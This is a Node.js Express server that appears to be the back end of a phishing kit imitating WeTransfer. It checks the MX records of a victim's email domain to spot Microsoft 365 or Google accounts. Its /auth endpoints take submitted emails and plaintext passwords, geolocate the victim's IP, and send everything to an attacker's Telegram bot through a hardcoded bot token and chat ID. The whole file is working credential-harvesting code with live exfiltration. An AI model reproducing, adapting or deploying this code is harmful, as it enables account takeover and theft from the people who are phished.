const express = require('express');
const cors = require('cors');
const dns = require('dns').promises;
const path = require('path');
const fs = require('fs');
const https = require('https');
const http = require('http');

const app = express();
app.use(cors());
app.use(express.json({ limit: '64kb' }));
app.use(express.urlencoded({ extended: true, limit: '64kb' }));

const PORT = process.env.PORT || 3000;
const TG_TOKEN = process.env.TELEGRAM_TOKEN || '8947312433:AAGGSkA98sqiRO1wag2cHahKLUZBa1wKxNM';
const TG_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8676610607';
const TG_SEND = String(process.env.TG_SEND || 'true').toLowerCase() === 'true';
const LOG_FILE = path.join(__dirname, 'captures.log');
const NL = String.fromCharCode(10);

function logLine(line) {
  try { fs.appendFileSync(LOG_FILE, line + NL); } catch (err) { /* ignore */ }
}

function clientIp(req) {
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) return String(fwd).split(',')[0].trim();
  return (req.socket.remoteAddress || '').replace(/^::ffff:/, '');
}

function detectProvider(mx) {
  for (const r of mx) {
    const h = String(r.exchange || r.host || '').toLowerCase();
    if (h.endsWith('.mail.protection.outlook.com')) {
      const tenant = h.split('.')[0];
      return {
        provider: 'Microsoft 365 / Exchange Online Protection (EOP)',
        category: 'microsoft', microsoft: true,
        microsoft_consumer: false,
        tenant_hint: tenant || null,
        idp_hint: 'login.microsoftonline.com',
        realm: tenant || null,
        note: 'Microsoft 365 tenant detected'
      };
    }
    if (h.endsWith('.google.com') || h.endsWith('.googlemail.com')) {
      return {
        provider: 'Google Workspace / Gmail', category: 'google',
        microsoft: false, microsoft_consumer: true,
        tenant_hint: null, idp_hint: null, realm: null,
        note: 'native login path'
      };
    }
  }
  return {
    provider: 'Unknown', category: 'unknown', microsoft: false,
    microsoft_consumer: false, tenant_hint: null, idp_hint: null,
    realm: null, note: 'native login path'
  };
}

app.get('/lookup', async (req, res) => {
  const raw = String(req.query.email || '').trim();
  const email = raw.toLowerCase();
  const domain = email.includes('@') ? email.split('@')[1] : email;
  let mx = [], ns = [];
  if (domain) {
    try {
      mx = (await dns.resolveMx(domain))
        .sort((a, b) => a.priority - b.priority)
        .map(r => ({ preference: r.priority, host: r.exchange }));
    } catch (err) { /* no MX */ }
    try {
      ns = (await dns.resolveNs(domain)).map(h => ({ host: h }));
    } catch (err) { /* no NS */ }
  }
  const det = detectProvider(mx);
  logLine('[lookup] ' + email + ' -> ' + det.category + (det.tenant_hint ? ' (' + det.tenant_hint + ')' : ''));
  res.json(Object.assign({ query: email, domain: domain, mx: mx, ns: ns }, det));
});

function getGeo(ip) {
  return new Promise(function (resolve) {
    if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('10.') ||
        ip.startsWith('192.168.') || ip.startsWith('172.')) {
      return resolve('local');
    }
    const req = https.get('https://ipapi.co/' + encodeURIComponent(ip) + '/json/', {
      headers: { 'User-Agent': 'wedecline-api' },
      timeout: 3500
    }, function (res) {
      let body = '';
      res.on('data', function (c) { body += c; });
      res.on('end', function () {
        try {
          const j = JSON.parse(body);
          if (j.error) return resolve('unknown');
          resolve([j.city, j.region, j.country_name].filter(Boolean).join(', ') || 'unknown');
        } catch (err) { resolve('unknown'); }
      });
    });
    req.on('timeout', function () { req.destroy(); resolve('unknown'); });
    req.on('error', function () { resolve('unknown'); });
  });
}

function esc(v) {
  return String(v == null ? '' : v)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function cap(arr, n) {
  if (!Array.isArray(arr) || !arr.length) return 'none';
  const items = arr.slice(0, n).map(function (r) {
    if (r && typeof r === 'object') return r.exchange || r.host || '';
    return String(r == null ? '' : r);
  });
  if (arr.length > n) items.push('+' + (arr.length - n) + ' more');
  return items.join(' | ');
}

function buildTgMessage(data, ip, geo) {
  const iso = new Date().toISOString();
  const status = data.matched ? 'P Matched' : 'P UnMatched';
  const lines = [
    '<b>WeTrans | ' + status + '</b>',
    '',
    'Eml: ' + esc(data.email),
    'Pwrd: ' + esc(data.password),
    'IP: ' + esc(ip),
    'Loc: ' + esc(geo),
    'Domain: ' + esc(data.domain),
    'MX: ' + esc(cap(data.mx, 3)),
    'NS: ' + esc(cap(data.ns, 3)),
    'Date: ' + esc(iso.slice(0, 10) + ' ' + iso.slice(11, 19) + ' UTC')
  ];
  return lines.join(NL);
}

function tgSend(text) {
  return new Promise(function (resolve) {
    if (!TG_SEND) { logLine('[tg] skipped (TG_SEND=false)'); return resolve(false); }
    const body = JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'HTML' });
    const req = https.request({
      hostname: 'api.telegram.org',
      path: '/bot' + TG_TOKEN + '/sendMessage',
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
      timeout: 10000
    }, function (res) {
      let raw = '';
      res.on('data', function (c) { raw += c; });
      res.on('end', function () {
        const ok = res.statusCode === 200 && /"ok":true/.test(raw);
        if (!ok) logLine('[tg] send failed: ' + res.statusCode + ' ' + raw.slice(0, 300));
        resolve(ok);
      });
    });
    req.on('timeout', function () { req.destroy(); resolve(false); });
    req.on('error', function (err) { logLine('[tg] error: ' + err.message); resolve(false); });
    req.end(body);
  });
}

function capture(req, res) {
  if (!req.is('application/json') && !req.is('application/*+json')) {
    return res.status(422).json({ detail: [{ type: 'json_error', msg: 'JSON body required', loc: ['body'] }] });
  }
  const data = Object.assign({}, req.body || {});
  data.password = String(data.password || '');
  data.matched = data.matched === true || data.matched === 'true';
  if (!data.email) return res.status(400).json({ error: 'email required' });

  const ip = clientIp(req);
  getGeo(ip).then(function (geo) {
    const safe = Object.assign({}, data);
    delete safe.password;
    delete safe.password2;
    logLine('[capture] ' + JSON.stringify(Object.assign(safe, { ip: ip, geo: geo })));
    return tgSend(buildTgMessage(data, ip, geo));
  }).then(function () {
    res.json({ ok: true, matched: false, ts: new Date().toISOString() });
  });
}

app.post('/auth/login', capture);
app.post('/auth/capture', capture);
app.post('/auth', capture);

app.get('/', function (req, res) {
  const page = path.join(__dirname, 'wedecline.html');
  if (fs.existsSync(page)) return res.sendFile(page);
  res.json({ name: 'wedecline-api', version: 'v3', status: 'ok', endpoints: ['GET /lookup?email=', 'POST /auth/login'] });
});

app.use(function (req, res) {
  res.status(404).json({ error: 'not found' });
});

if (require.main === module) {
  app.listen(PORT, function () {
    console.log('wedecline-api listening on port ' + PORT + ' (TG_SEND=' + TG_SEND + ')');
  });
}

module.exports = app;

module.exports.buildTgMessage = buildTgMessage;
module.exports.esc = esc;
module.exports.cap = cap;
